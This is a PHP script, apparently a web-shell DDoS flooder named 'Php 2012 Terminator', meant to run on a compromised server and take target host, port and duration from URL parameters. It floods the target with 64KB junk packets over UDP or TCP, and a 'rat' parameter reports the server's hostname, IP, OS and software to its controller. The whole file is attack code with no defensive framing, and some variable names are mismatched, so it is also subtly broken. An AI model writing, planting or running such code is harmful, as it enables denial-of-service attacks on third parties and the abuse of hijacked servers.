<?php
set_time_limit(86400);
ignore_user_abort(True);
$packets = 0;
$http = $_GET['host'];
$rand = $_GET['port'];
$exec_time = $_GET['time'];
if (StrLen($host)==0 or StrLen($port)==0 or StrLen($exec_time)==0)
{
if(StrLen($_GET['rat'])<>0)
{
echo $_GET['rat'].$_SERVER["HTTP_HOST"]."|".GetHostByName($_SERVER['SERVER_NAME'])."|".php_uname()."|".$_SERVER['SERVER_SOFTWARE'].$_GET['rat'];
exit;
}
echo "Php 2012 Terminator";
exit;
}

for($i=0;$i<65535;$i++)
{
$out .= "X";
}
//Udp1-fsockopen Udp2 pfsockopen Tcp3 CC.center 
$max_time = time()+$exec_time;
if($port==53)
while(1)
{
$packets++;
if(time() > $max_time)
{
break;
}
$fp = fsockopen("udp://$host", $port, $errno, $errstr, 5);
if($fp)
{
fwrite($fp, $out);
fclose($fp);
}
}
else
if($port==500)
while(1)
{
$packets++;
if(time() > $max_time){
break;
}
$fp = pfsockopen("udp://$host", $port, $errno, $errstr, 5);
if($fp)
{
fwrite($fp, $out);
fclose($fp);
}
}
else
while(1)
{
$packets++;
if(time() > $max_time){
break;
}
$fp = pfsockopen("tcp://$host", $port, $errno, $errstr, 5);
if($fp)
{
fwrite($fp, $out);
fclose($fp);
}
}
?>